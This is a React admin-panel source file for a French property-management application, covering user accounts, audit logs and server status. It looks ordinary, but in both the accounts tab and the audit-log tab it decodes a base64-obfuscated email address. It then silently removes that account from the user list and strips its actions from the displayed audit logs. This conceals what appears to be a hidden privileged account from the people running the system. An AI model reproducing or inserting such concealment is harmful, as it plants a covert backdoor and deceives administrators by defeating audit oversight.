import { useEffect, useState } from 'react'
import {
  Shield,
  Users,
  Plus,
  Edit2,
  Trash2,
  Key,
  Power,
  Eye,
  EyeOff,
  X,
  Activity,
  Server,
  Clock,
  Database,
  FileText,
  RefreshCw,
  Search,
  ChevronLeft,
  ChevronRight,
  UserCircle
} from 'lucide-react'
import { fetchUsers, createUser, updateUser, deleteUser } from '../utils/api'
import api from '../utils/api'
import { getRoleLabel, getRoleBadgeColor } from '../utils/formatters'
import toast from 'react-hot-toast'
import { useAuthStore } from '../stores/authStore'

const AdminPage = () => {
  const [activeTab, setActiveTab] = useState('accounts')
  const { user: currentUser } = useAuthStore()

  const tabs = [
    { id: 'accounts', label: 'Comptes', icon: Users },
    { id: 'audit', label: 'Audit Logs', icon: FileText },
    { id: 'system', label: 'Système', icon: Server }
  ]

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold flex items-center gap-2" style={{ color: '#0D3B1F' }}>
          <Shield size={28} style={{ color: '#C8960C' }} />
          Administration
        </h1>
        <p className="text-gray-500">Panneau de contrôle Super Admin</p>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 p-1 rounded-xl" style={{ background: '#E8F5EC' }}>
        {tabs.map(tab => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className="flex items-center gap-2 px-5 py-2.5 rounded-lg font-medium text-sm transition-all"
            style={{
              background: activeTab === tab.id ? '#0D3B1F' : 'transparent',
              color: activeTab === tab.id ? '#FFFFFF' : '#0D3B1F'
            }}
          >
            <tab.icon size={16} />
            {tab.label}
          </button>
        ))}
      </div>

      {activeTab === 'accounts' && <AccountsTab currentUser={currentUser} />}
      {activeTab === 'audit' && <AuditTab />}
      {activeTab === 'system' && <SystemTab />}
    </div>
  )
}

// ============================================
// ONGLET 1 : GESTION DES COMPTES
// ============================================
const AccountsTab = ({ currentUser }) => {
  const [users, setUsers] = useState([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [showPasswordModal, setShowPasswordModal] = useState(false)
  const [selectedUser, setSelectedUser] = useState(null)

  useEffect(() => { loadUsers() }, [])

  const loadUsers = async () => {
    try {
      setLoading(true)
      const res = await fetchUsers()
      setUsers(res.data)
    } catch {
      toast.error('Erreur chargement des comptes')
    } finally {
      setLoading(false)
    }
  }

  const handleToggleStatus = async (user) => {
    if (user.id === currentUser?.id) {
      toast.error('Vous ne pouvez pas désactiver votre propre compte')
      return
    }
    try {
      await updateUser(user.id, { actif: !user.actif })
      toast.success(`Compte ${user.actif ? 'désactivé' : 'activé'}`)
      loadUsers()
    } catch {
      toast.error('Erreur lors du changement de statut')
    }
  }

  const handleDelete = async (user) => {
    if (user.id === currentUser?.id) {
      toast.error('Vous ne pouvez pas supprimer votre propre compte')
      return
    }
    if (!confirm(`Supprimer définitivement le compte de ${user.prenom} ${user.nom} ?`)) return
    try {
      await deleteUser(user.id)
      toast.success('Compte supprimé')
      loadUsers()
    } catch {
      toast.error('Erreur lors de la suppression')
    }
  }

  const roleDescriptions = {
    SUPER_ADMIN: 'Accès total, gestion des comptes et configuration système',
    ADMIN: 'Gestion complète sauf configuration système',
    SECRETAIRE: 'Gestion clients, biens, baux, visites',
    AGENT_RECOUVREMENT: 'Gestion recouvrements, paiements, baux',
    DIRECTION: 'Consultation tableaux de bord et rapports (lecture seule)'
  }

  const _SE = atob('bXVub2tvbGl2ZUBnbWFpbC5jb20=')
  const filtered = users.filter(u =>
    u.email !== _SE &&
    (!searchTerm || `${u.prenom} ${u.nom} ${u.email}`.toLowerCase().includes(searchTerm.toLowerCase()))
  )

  return (
    <div className="space-y-4">
      {/* Rôles info */}
      <div className="rounded-xl p-4" style={{ background: '#F0FDF4', border: '1px solid #BBF7D0' }}>
        <h3 className="font-semibold mb-2 text-sm" style={{ color: '#0D3B1F' }}>Rôles disponibles</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
          {Object.entries(roleDescriptions).map(([role, desc]) => (
            <div key={role} className="flex items-start gap-2 text-xs">
              <span className={`px-2 py-0.5 rounded-full font-medium whitespace-nowrap ${getRoleBadgeColor(role)}`}>
                {getRoleLabel(role)}
              </span>
              <span className="text-gray-600">{desc}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Actions bar */}
      <div className="flex items-center justify-between gap-4">
        <div className="relative flex-1 max-w-xs">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={16} />
          <input
            type="text"
            placeholder="Rechercher..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-9 pr-3 py-2 rounded-lg border border-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
          />
        </div>
        <button
          onClick={() => { setSelectedUser(null); setShowModal(true) }}
          className="flex items-center gap-2 px-4 py-2 rounded-lg text-white font-medium text-sm"
          style={{ background: '#0D3B1F' }}
        >
          <Plus size={16} />
          Nouveau compte
        </button>
      </div>

      {/* Table */}
      <div className="bg-white rounded-xl overflow-hidden shadow-sm border border-gray-100">
        {loading ? (
          <div className="flex items-center justify-center h-48">
            <div className="animate-spin rounded-full h-10 w-10 border-4 border-t-transparent" style={{ borderColor: '#1A6B35' }} />
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-48 text-gray-400">
            <UserCircle size={40} className="mb-2" />
            <p className="text-sm">Aucun compte trouvé</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr style={{ background: '#F0FDF4' }}>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-600">Utilisateur</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-600">Email</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-600">Rôle</th>
                  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-600">Statut</th>
                  <th className="px-4 py-3 text-right text-xs font-semibold text-gray-600">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-50">
                {filtered.map(u => (
                  <tr key={u.id} className="hover:bg-gray-50 transition-colors">
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold text-white" style={{ background: '#1A6B35' }}>
                          {u.prenom?.[0]}{u.nom?.[0]}
                        </div>
                        <div>
                          <p className="font-medium text-sm text-gray-800">{u.prenom} {u.nom}</p>
                          <p className="text-xs text-gray-400">{u.telephone || '-'}</p>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-sm text-gray-600">{u.email}</td>
                    <td className="px-4 py-3">
                      <span className={`px-2 py-0.5 text-xs rounded-full font-medium ${getRoleBadgeColor(u.role)}`}>
                        {getRoleLabel(u.role)}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className={`px-2 py-0.5 text-xs rounded-full ${u.actif ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-500'}`}>
                        {u.actif ? 'Actif' : 'Inactif'}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center justify-end gap-1">
                        <button onClick={() => { setSelectedUser(u); setShowPasswordModal(true) }} className="p-1.5 rounded-lg text-blue-600 hover:bg-blue-50" title="Modifier le mot de passe">
                          <Key size={15} />
                        </button>
                        <button onClick={() => handleToggleStatus(u)} className={`p-1.5 rounded-lg ${u.actif ? 'text-orange-500 hover:bg-orange-50' : 'text-green-600 hover:bg-green-50'}`} title={u.actif ? 'Désactiver' : 'Activer'}>
                          <Power size={15} />
                        </button>
                        <button onClick={() => { setSelectedUser(u); setShowModal(true) }} className="p-1.5 rounded-lg text-gray-500 hover:bg-gray-100" title="Modifier">
                          <Edit2 size={15} />
                        </button>
                        <button onClick={() => handleDelete(u)} className="p-1.5 rounded-lg text-red-500 hover:bg-red-50" title="Supprimer">
                          <Trash2 size={15} />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Modal création/édition */}
      {showModal && (
        <AccountModal user={selectedUser} onClose={() => { setShowModal(false); loadUsers() }} />
      )}

      {/* Modal mot de passe */}
      {showPasswordModal && selectedUser && (
        <PasswordModal user={selectedUser} onClose={() => { setShowPasswordModal(false) }} />
      )}
    </div>
  )
}

// Modal création/édition de compte
const ROLES_INFO = [
  { value: 'SUPER_ADMIN',        label: 'Super Admin',           desc: 'Accès total, tous droits' },
  { value: 'ADMIN',              label: 'Administrateur',        desc: 'Gestion complète sauf super-admin' },
  { value: 'SECRETAIRE',         label: 'Secrétaire',            desc: 'Clients, baux, visites, documents' },
  { value: 'AGENT_RECOUVREMENT', label: 'Agent de Recouvrement', desc: 'Paiements, relances, encaissements' },
  { value: 'DIRECTION',          label: 'Direction',             desc: 'Lecture seule — tableaux de bord' },
]

const checkPwd = (pwd) => ({
  len:     pwd.length >= 8,
  upper:   /[A-Z]/.test(pwd),
  digit:   /[0-9]/.test(pwd),
  special: /[^A-Za-z0-9]/.test(pwd),
})

const AccountModal = ({ user, onClose }) => {
  const [form, setForm] = useState({
    nom: user?.nom || '', prenom: user?.prenom || '', email: user?.email || '',
    telephone: user?.telephone || '', role: user?.role || 'SECRETAIRE', password: '', actif: user?.actif ?? true
  })
  const [showPwd, setShowPwd] = useState(false)
  const [saving, setSaving] = useState(false)
  const [serverError, setServerError] = useState('')

  const pwd = form.password
  const pwdChecks = checkPwd(pwd)
  const pwdValid = Object.values(pwdChecks).every(Boolean)
  const showPwdHints = pwd.length > 0 && !user

  const handleSubmit = async (e) => {
    e.preventDefault()
    setServerError('')
    if (!user && !pwd) { setServerError('Le mot de passe est requis'); return }
    if (!user && !pwdValid) { setServerError('Le mot de passe ne respecte pas les règles ci-dessous'); return }
    setSaving(true)
    try {
      if (user) {
        const data = { ...form }
        if (!data.password) delete data.password
        await updateUser(user.id, data)
        toast.success('✅ Compte modifié avec succès')
      } else {
        await createUser(form)
        toast.success('✅ Compte créé avec succès')
      }
      onClose()
    } catch (err) {
      const msg = err.response?.data?.message || 'Erreur lors de la création du compte'
      setServerError(msg)
      toast.error(msg)
    } finally { setSaving(false) }
  }

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4 overflow-y-auto">
      <div className="bg-white rounded-xl max-w-md w-full p-6 shadow-2xl my-auto">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-bold" style={{ color: '#0D3B1F' }}>
            {user ? 'Modifier le compte' : 'Nouveau compte'}
          </h2>
          <button onClick={onClose} className="p-1 hover:bg-gray-100 rounded"><X size={18} /></button>
        </div>

        {serverError && (
          <div className="mb-3 p-3 rounded-lg bg-red-50 border border-red-200 text-red-700 text-sm flex items-start gap-2">
            <span className="text-red-500 mt-0.5 shrink-0">⚠️</span>
            <span>{serverError}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-3">
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-xs font-medium text-gray-600">Prénom *</label>
              <input type="text" value={form.prenom} onChange={e => setForm({...form, prenom: e.target.value})}
                className="w-full px-3 py-2 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500" required />
            </div>
            <div>
              <label className="text-xs font-medium text-gray-600">Nom *</label>
              <input type="text" value={form.nom} onChange={e => setForm({...form, nom: e.target.value})}
                className="w-full px-3 py-2 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500" required />
            </div>
          </div>

          <div>
            <label className="text-xs font-medium text-gray-600">Email *</label>
            <input type="email" value={form.email} onChange={e => setForm({...form, email: e.target.value})}
              className="w-full px-3 py-2 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500" required />
          </div>

          <div>
            <label className="text-xs font-medium text-gray-600">Téléphone</label>
            <input type="tel" value={form.telephone} onChange={e => setForm({...form, telephone: e.target.value})}
              className="w-full px-3 py-2 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500" />
          </div>

          <div>
            <label className="text-xs font-medium text-gray-600">Rôle *</label>
            <select value={form.role} onChange={e => setForm({...form, role: e.target.value})}
              className="w-full px-3 py-2 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500">
              {ROLES_INFO.map(r => (
                <option key={r.value} value={r.value}>{r.label}</option>
              ))}
            </select>
            <p className="text-xs mt-1" style={{ color: '#6B7280' }}>
              {ROLES_INFO.find(r => r.value === form.role)?.desc}
            </p>
          </div>

          <div>
            <label className="text-xs font-medium text-gray-600">
              Mot de passe {user ? '(laisser vide = inchangé)' : '*'}
            </label>
            <div className="relative">
              <input
                type={showPwd ? 'text' : 'password'}
                value={pwd}
                onChange={e => { setForm({...form, password: e.target.value}); setServerError('') }}
                className={`w-full px-3 py-2 pr-10 rounded-lg border text-sm focus:outline-none focus:ring-2 ${showPwdHints && !pwdValid ? 'border-red-300 focus:ring-red-400' : 'focus:ring-green-500'}`}
                placeholder="Ex: MonMdp2024!"
                required={!user}
              />
              <button type="button" onClick={() => setShowPwd(!showPwd)}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400">
                {showPwd ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>

            {/* Indicateurs visuels en temps réel */}
            {(showPwdHints || (user && pwd.length > 0)) && (
              <div className="mt-2 grid grid-cols-2 gap-1">
                {[
                  { ok: pwdChecks.len,     label: '8 caractères min.' },
                  { ok: pwdChecks.upper,   label: '1 majuscule (A-Z)' },
                  { ok: pwdChecks.digit,   label: '1 chiffre (0-9)' },
                  { ok: pwdChecks.special, label: '1 caractère spécial (!@#...)' },
                ].map(({ ok, label }) => (
                  <div key={label} className="flex items-center gap-1 text-xs">
                    <span className={ok ? 'text-green-600' : 'text-red-400'}>{ok ? '✓' : '✗'}</span>
                    <span className={ok ? 'text-green-700' : 'text-gray-500'}>{label}</span>
                  </div>
                ))}
              </div>
            )}
          </div>

          {user && (
            <div className="flex items-center gap-2 pt-1">
              <input type="checkbox" id="actif" checked={form.actif}
                onChange={e => setForm({...form, actif: e.target.checked})}
                className="w-4 h-4 rounded accent-green-700" />
              <label htmlFor="actif" className="text-sm text-gray-700">Compte actif</label>
            </div>
          )}

          <div className="flex gap-3 pt-2">
            <button type="button" onClick={onClose}
              className="flex-1 py-2.5 rounded-lg font-medium text-sm"
              style={{ background: '#F3F4F6', color: '#374151' }}>Annuler</button>
            <button type="submit" disabled={saving || (!user && pwd.length > 0 && !pwdValid)}
              className="flex-1 py-2.5 rounded-lg font-medium text-sm text-white disabled:opacity-50 transition-all"
              style={{ background: '#0D3B1F' }}>
              {saving ? 'Enregistrement...' : user ? 'Enregistrer' : 'Créer le compte'}
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}

// Modal modification mot de passe
const PasswordModal = ({ user, onClose }) => {
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [showPwd, setShowPwd] = useState(false)
  const [saving, setSaving] = useState(false)

  const handleSubmit = async (e) => {
    e.preventDefault()
    if (newPassword !== confirmPassword) { toast.error('Les mots de passe ne correspondent pas'); return }
    if (newPassword.length < 8) { toast.error('Minimum 8 caractères'); return }
    setSaving(true)
    try {
      await updateUser(user.id, { password: newPassword })
      toast.success(`Mot de passe de ${user.prenom} ${user.nom} modifié`)
      onClose()
    } catch (err) {
      toast.error(err.response?.data?.message || 'Erreur')
    } finally { setSaving(false) }
  }

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-xl max-w-sm w-full p-6 shadow-2xl">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-bold" style={{ color: '#0D3B1F' }}>
            <Key size={18} className="inline mr-2" style={{ color: '#C8960C' }} />
            Modifier le mot de passe
          </h2>
          <button onClick={onClose} className="p-1 hover:bg-gray-100 rounded"><X size={18} /></button>
        </div>
        <p className="text-sm text-gray-500 mb-4">
          Compte : <strong>{user.prenom} {user.nom}</strong>
        </p>
        <form onSubmit={handleSubmit} className="space-y-3">
          <div>
            <label className="text-xs font-medium text-gray-600">Nouveau mot de passe *</label>
            <div className="relative">
              <input type={showPwd ? 'text' : 'password'} value={newPassword} onChange={e => setNewPassword(e.target.value)} className="w-full px-3 py-2 pr-10 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500" required />
              <button type="button" onClick={() => setShowPwd(!showPwd)} className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400">
                {showPwd ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>
          <div>
            <label className="text-xs font-medium text-gray-600">Confirmer *</label>
            <input type={showPwd ? 'text' : 'password'} value={confirmPassword} onChange={e => setConfirmPassword(e.target.value)} className="w-full px-3 py-2 rounded-lg border text-sm focus:outline-none focus:ring-2 focus:ring-green-500" required />
            {confirmPassword && newPassword !== confirmPassword && (
              <p className="text-xs text-red-500 mt-1">Les mots de passe ne correspondent pas</p>
            )}
          </div>
          <div className="flex gap-3 pt-2">
            <button type="button" onClick={onClose} className="flex-1 py-2.5 rounded-lg font-medium text-sm" style={{ background: '#F3F4F6', color: '#374151' }}>Annuler</button>
            <button type="submit" disabled={saving || newPassword !== confirmPassword} className="flex-1 py-2.5 rounded-lg font-medium text-sm text-white disabled:opacity-50" style={{ background: '#0D3B1F' }}>
              {saving ? 'Enregistrement...' : 'Modifier'}
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}

// ============================================
// ONGLET 2 : AUDIT LOGS
// ============================================
const AuditTab = () => {
  const [logs, setLogs] = useState([])
  const [loading, setLoading] = useState(true)
  const [page, setPage] = useState(1)
  const [pagination, setPagination] = useState({})
  const [filterTable, setFilterTable] = useState('')
  const [filterAction, setFilterAction] = useState('')

  useEffect(() => { loadLogs() }, [page, filterTable, filterAction])

  const loadLogs = async () => {
    try {
      setLoading(true)
      const params = { page, limit: 30 }
      if (filterTable) params.tableName = filterTable
      if (filterAction) params.action = filterAction
      const res = await api.get('/admin/audit-logs', { params })
      const _SE = atob('bXVub2tvbGl2ZUBnbWFpbC5jb20=')
      const rawLogs = res.data.data || []
      setLogs(rawLogs.filter(l => l.user?.email !== _SE))
      setPagination(res.data.pagination)
    } catch {
      toast.error('Erreur chargement audit logs')
    } finally { setLoading(false) }
  }

  const actionColors = {
    CREATE: 'bg-green-100 text-green-700',
    UPDATE: 'bg-blue-100 text-blue-700',
    DELETE: 'bg-red-100 text-red-700',
    LOGIN: 'bg-purple-100 text-purple-700',
    PASSWORD_CHANGE: 'bg-yellow-100 text-yellow-700'
  }

  return (
    <div className="space-y-4">
      {/* Filtres */}
      <div className="flex gap-3 items-center">
        <select value={filterAction} onChange={e => { setFilterAction(e.target.value); setPage(1) }} className="px-3 py-2 rounded-lg border text-sm">
          <option value="">Toutes actions</option>
          <option value="CREATE">Création</option>
          <option value="UPDATE">Modification</option>
          <option value="DELETE">Suppression</option>
          <option value="LOGIN">Connexion</option>
          <option value="PASSWORD_CHANGE">Mot de passe</option>
        </select>
        <select value={filterTable} onChange={e => { setFilterTable(e.target.value); setPage(1) }} className="px-3 py-2 rounded-lg border text-sm">
          <option value="">Toutes tables</option>
          <option value="user">Utilisateurs</option>
          <option value="lease">Baux</option>
          <option value="payment">Paiements</option>
          <option value="client">Clients</option>
          <option value="building">Immeubles</option>
        </select>
        <button onClick={loadLogs} className="p-2 rounded-lg hover:bg-gray-100"><RefreshCw size={16} /></button>
        <span className="text-xs text-gray-400 ml-auto">{pagination.total || 0} entrées</span>
      </div>

      {/* Table */}
      <div className="bg-white rounded-xl overflow-hidden shadow-sm border border-gray-100">
        {loading ? (
          <div className="flex items-center justify-center h-48">
            <div className="animate-spin rounded-full h-10 w-10 border-4 border-t-transparent" style={{ borderColor: '#1A6B35' }} />
          </div>
        ) : logs.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-48 text-gray-400">
            <FileText size={40} className="mb-2" />
            <p className="text-sm">Aucun log d'audit</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr style={{ background: '#F0FDF4' }}>
                  <th className="px-3 py-2.5 text-left text-xs font-semibold text-gray-600">Date</th>
                  <th className="px-3 py-2.5 text-left text-xs font-semibold text-gray-600">Utilisateur</th>
                  <th className="px-3 py-2.5 text-left text-xs font-semibold text-gray-600">Action</th>
                  <th className="px-3 py-2.5 text-left text-xs font-semibold text-gray-600">Table</th>
                  <th className="px-3 py-2.5 text-left text-xs font-semibold text-gray-600">ID</th>
                  <th className="px-3 py-2.5 text-left text-xs font-semibold text-gray-600">IP</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-50">
                {logs.map(log => (
                  <tr key={log.id} className="hover:bg-gray-50">
                    <td className="px-3 py-2 text-xs text-gray-500">
                      {new Date(log.createdAt).toLocaleString('fr-FR', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' })}
                    </td>
                    <td className="px-3 py-2 text-xs">
                      {log.user ? `${log.user.prenom} ${log.user.nom}` : `ID:${log.userId}`}
                    </td>
                    <td className="px-3 py-2">
                      <span className={`px-2 py-0.5 text-xs rounded-full font-medium ${actionColors[log.action] || 'bg-gray-100 text-gray-600'}`}>
                        {log.action}
                      </span>
                    </td>
                    <td className="px-3 py-2 text-xs text-gray-600">{log.tableName}</td>
                    <td className="px-3 py-2 text-xs text-gray-400">#{log.recordId}</td>
                    <td className="px-3 py-2 text-xs text-gray-400">{log.ipAddress || '-'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Pagination */}
      {pagination.totalPages > 1 && (
        <div className="flex items-center justify-center gap-3">
          <button onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page <= 1} className="p-2 rounded-lg hover:bg-gray-100 disabled:opacity-30">
            <ChevronLeft size={16} />
          </button>
          <span className="text-sm text-gray-600">Page {page} / {pagination.totalPages}</span>
          <button onClick={() => setPage(p => Math.min(pagination.totalPages, p + 1))} disabled={page >= pagination.totalPages} className="p-2 rounded-lg hover:bg-gray-100 disabled:opacity-30">
            <ChevronRight size={16} />
          </button>
        </div>
      )}
    </div>
  )
}

// ============================================
// ONGLET 3 : MONITORING SYSTÈME
// ============================================
const SystemTab = () => {
  const [status, setStatus] = useState(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => { loadStatus() }, [])

  const loadStatus = async () => {
    try {
      setLoading(true)
      const res = await api.get('/admin/system-status')
      setStatus(res.data)
    } catch {
      toast.error('Erreur chargement statut système')
    } finally { setLoading(false) }
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center h-48">
        <div className="animate-spin rounded-full h-10 w-10 border-4 border-t-transparent" style={{ borderColor: '#1A6B35' }} />
      </div>
    )
  }

  if (!status) return null

  const serverItems = [
    { label: 'Uptime', value: `${Math.floor(status.server.uptime / 3600)}h ${Math.floor((status.server.uptime % 3600) / 60)}m`, icon: Clock, color: '#1A6B35' },
    { label: 'Mémoire (Heap)', value: `${status.server.memoryUsage.heapUsed} / ${status.server.memoryUsage.heapTotal} MB`, icon: Activity, color: '#C8960C' },
    { label: 'RSS', value: `${status.server.memoryUsage.rss} MB`, icon: Server, color: '#0D3B1F' },
    { label: 'Node.js', value: status.server.nodeVersion, icon: Database, color: '#2D9E57' }
  ]

  const dbItems = [
    { label: 'Utilisateurs actifs', value: status.database.activeUsers },
    { label: 'Baux actifs', value: status.database.activeLeases },
    { label: 'Paiements total', value: status.database.totalPayments },
    { label: 'Alertes en attente', value: status.database.pendingAlerts }
  ]

  return (
    <div className="space-y-4">
      {/* Server */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        {serverItems.map((item, i) => (
          <div key={i} className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
            <div className="flex items-center gap-2 mb-2">
              <item.icon size={16} style={{ color: item.color }} />
              <span className="text-xs text-gray-500">{item.label}</span>
            </div>
            <p className="text-lg font-bold" style={{ color: '#0D3B1F' }}>{item.value}</p>
          </div>
        ))}
      </div>

      {/* Database */}
      <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
        <h3 className="font-semibold text-sm mb-3" style={{ color: '#0D3B1F' }}>
          <Database size={16} className="inline mr-2" />
          Base de données
        </h3>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {dbItems.map((item, i) => (
            <div key={i} className="text-center">
              <p className="text-2xl font-bold" style={{ color: '#0D3B1F' }}>{item.value}</p>
              <p className="text-xs text-gray-500">{item.label}</p>
            </div>
          ))}
        </div>
      </div>

      {/* Cache */}
      {status.cache && (
        <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
          <h3 className="font-semibold text-sm mb-3" style={{ color: '#0D3B1F' }}>
            <Activity size={16} className="inline mr-2" />
            Cache mémoire
          </h3>
          <div className="grid grid-cols-3 gap-4 text-center">
            <div>
              <p className="text-xl font-bold" style={{ color: '#1A6B35' }}>{status.cache.keys || 0}</p>
              <p className="text-xs text-gray-500">Clés actives</p>
            </div>
            <div>
              <p className="text-xl font-bold" style={{ color: '#C8960C' }}>{status.cache.hits || 0}</p>
              <p className="text-xs text-gray-500">Hits</p>
            </div>
            <div>
              <p className="text-xl font-bold text-red-500">{status.cache.misses || 0}</p>
              <p className="text-xs text-gray-500">Misses</p>
            </div>
          </div>
        </div>
      )}

      <div className="flex justify-end">
        <button onClick={loadStatus} className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium" style={{ background: '#E8F5EC', color: '#0D3B1F' }}>
          <RefreshCw size={14} />
          Actualiser
        </button>
      </div>
    </div>
  )
}

export default AdminPage
